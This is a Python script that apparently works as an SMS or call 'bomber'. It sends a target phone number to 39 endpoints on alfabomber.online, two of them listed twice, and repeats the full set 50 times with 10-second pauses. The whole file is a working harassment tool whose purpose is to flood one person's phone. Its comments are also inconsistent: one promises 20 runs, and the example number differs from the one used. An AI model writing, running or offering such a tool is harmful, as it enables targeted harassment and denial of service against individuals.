import requests
import json
import time

def smsg(number):
    number = str(number)
    
    # List of APIs with their corresponding URLs, headers, and payloads
    apis = [
        {
            "url": "https://alfabomber.online/PHPcall/1.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/2.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/3.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/4.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/5.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/6.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/7.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/8.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/9.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/10.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/11.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/12.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/13.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/14.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/15.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/16.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/17.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/18.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/19.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/20.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/21.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/22.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/23.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/24.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/25.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/26.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/27.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/28.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/29.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/30.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/31.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/32.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/33.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/34.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/35.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/36.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/37.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/38.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        {
            "url": "https://alfabomber.online/PHPcall/39.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        
        
        
        # Add more API dictionaries here...
        {
            "url": "https://alfabomber.online/PHPcall/22.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        },
        # Add more API dictionaries here...
        {
            "url": "https://alfabomber.online/PHPcall/39.php",
            "method": "GET",
            "params": {"alfabomb": number},
            "headers": {}
        }
    ]
    
    # Run the requests for 20 times
    for _ in range(50):
        for api in apis:
            if api["method"] == "GET":
                response = requests.get(api["url"], params=api.get("params", {}), headers=api.get("headers", {}))
            elif api["method"] == "POST":
                response = requests.post(api["url"], json=api.get("data", {}), headers=api.get("headers", {}))
            elif api["method"] == "PUT":
                response = requests.put(api["url"], json=api.get("data", {}), headers=api.get("headers", {}))
            print(f"Request to {api['url']} - Status Code: {response.status_code}")
            # time.sleep(2)
        # Add a delay of 1 second between requests
        time.sleep(10)

# Example usage:
#smsg("993650")  # Replace "9336734442" with the phone number you want to use
